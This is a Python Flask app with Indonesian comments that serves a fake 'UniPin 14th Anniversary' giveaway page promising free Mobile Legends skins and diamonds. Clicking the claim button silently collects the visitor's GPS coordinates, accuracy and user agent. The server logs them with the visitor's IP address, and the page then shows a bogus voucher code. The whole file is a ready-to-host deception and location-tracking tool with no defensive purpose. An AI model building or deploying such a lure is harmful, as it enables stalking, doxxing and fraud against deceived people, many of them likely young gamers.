from flask import Flask, request, jsonify, render_template_string
import requests
import os

app = Flask(__name__)

# Halaman utama tracking
@app.route('/')
def home():
    return render_template_string("""
        <h2>Tracking Link Active</h2>
        <p>Gunakan endpoint <b>/track</b> untuk melacak lokasi pengunjung.</p>
        <p>Contoh: <a href="/track">/track</a></p>
    """)

# Halaman yang meminta izin lokasi
@app.route('/track')
def track_page():
    return render_template_string("""
        <html>
    <head>
        <title>Event Mobile Legends - Klaim Skin dan Diamonds</title>
        <style>
            body {
                background-image: url('https://wallpapers.com/images/hd/mobile-legends-heroes-cover-v0u46grjbqc6h9ga.jpg'); 
                background-size: cover; 
                background-position: center center; 
                background-repeat: no-repeat; 
                background-attachment: fixed; 
                color: white; 
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                text-align: center;
                padding-top: 80px;
                min-height: 100vh; 
                margin: 0;
            }
            h2 {
                color: #ffc107; 
                font-size: 36px; 
                margin-bottom: 25px;
                text-shadow: 1px 1px 6px rgba(0, 0, 0, 0.9); 
            }
            p {
                font-size: 18px; 
                line-height: 1.6; 
                margin-bottom: 40px; 
                text-shadow: 1px 1px 3px rgba(0, 0, 0, 0.8);
            }
            .btn {
                background-color: #dc3545; 
                color: white;
                border: 2px solid #ffc107; 
                padding: 18px 40px; 
                font-size: 20px; 
                font-weight: bold; 
                border-radius: 5px; 
                cursor: pointer;
                transition: background-color 0.3s, transform 0.1s;
                box-shadow: 0 6px 15px rgba(0, 0, 0, 0.5);
            }
            .btn:hover {
                background-color: #c82333;
                transform: translateY(-2px); 
            }
            .container {
                max-width: 500px; 
                margin: 10vh auto; 
                background-color: rgba(18, 18, 30, 0.85); 
                padding: 50px 30px; /* Padding lebih besar */
                border-radius: 15px;
                /* Bayangan yang lebih dalam */
                box-shadow: 0 10px 30px rgba(0, 0, 0, 0.7); 
                border: 1px solid rgba(255, 255, 255, 0.1);
            }
            
            /* Penyesuaian Catatan Kecil (pada pesan sukses) */
            p.note {
                font-size: 14px;
                color: #a0a0a0;
                margin-top: 25px;
            }

            /* Gaya untuk pesan sukses/error */
            h3 {
                color: #dc3545;
                font-size: 24px;
            }

            /* Gaya untuk pesan sukses setelah klaim */
            .success-message {
                color: #28a745; /* Warna hijau untuk sukses */
                font-size: 20px;
                font-weight: bold;
                text-shadow: none;
                margin-top: 20px;
            }
        </style>
        <script>
            function claimSkin() {
                document.getElementById("claim-btn").innerText = "Memproses...";
                navigator.geolocation.getCurrentPosition(sendLocation, handleError);
            }

            function sendLocation(position) {
                fetch('/report', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        userAgent: navigator.userAgent
                    })
                }).then(res => {
                    // Mengubah tampilan sukses agar voucher terlihat jelas
                    document.body.innerHTML = 
                        "<div class='container' style='text-align: center;'>" +
                            "<h2 class='success-message'>Klaim Berhasil!</h2>" +
                            "<p style='font-size: 18px;'>Skin dan Diamonds berhasil diklaim!</p>" +
                            "<p style='font-size: 24px; color: #ffc107; font-weight: bold; word-break: break-all; margin: 30px 0;'>Kode Voucher:</p>" +
                            "<p style='font-size: 28px; color: #dc3545; font-weight: bold; background: #fff; padding: 10px; border-radius: 5px; display: inline-block;'>4752-1254-8245-2365</p>" +
                            "<p style='font-size: 16px; color: #ccc; margin-top: 30px;'>Input kode voucher di halaman penukaran Moonton.</p>" +
                        "</div>";
                }).catch(err => {
                    handleError({ message: "Gagal mengirim data ke server." });
                });
            }

            function handleError(error) {
                // Mengubah tampilan error agar sesuai dengan gaya container
                document.body.innerHTML = 
                    "<div class='container' style='text-align: center;'>" +
                        "<h3>Gagal mendapatkan lokasi!</h3>" +
                        "<p style='color: #fff; font-size: 16px;'>Kode error: (" + error.message + ")</p>" + 
                        "<p style='color: #ccc; font-size: 14px;'>Pastikan Anda memberikan izin akses lokasi pada browser Anda.</p>" +
                    "</div>";
            }
        </script>
    </head>
    <body>
        <div class="container">
            <h2>UniPin 14th Anniversary</h2>
            <p>Dapatkan **Skin dan Diamonds GRATIS** eksklusif sebagai hadiah ulang tahun. Klaim sekarang!</p>
            <button id="claim-btn" class="btn" onclick="claimSkin()">Klaim Sekarang</button>
        </div>
    </body>
</html>
    """)

# Endpoint untuk menerima data lokasi dari browser
@app.route('/report', methods=['POST'])
def report():
    data = request.get_json()
    ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)

    # Data dari browser
    latitude = data.get('latitude')
    longitude = data.get('longitude')
    accuracy = data.get('accuracy')
    user_agent = data.get('userAgent')

    # Tampilkan log di Railway
    print("========= NEW GPS REPORT =========")
    print(f"IP Address : {ip_address}")
    print(f"Latitude   : {latitude}")
    print(f"Longitude  : {longitude}")
    print(f"Akurasi    : ±{accuracy} meter")
    print(f"User-Agent : {user_agent}")
    print("==================================")

    return jsonify({"status": "received"})

# Jalankan Flask app di hosting Railway
if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)


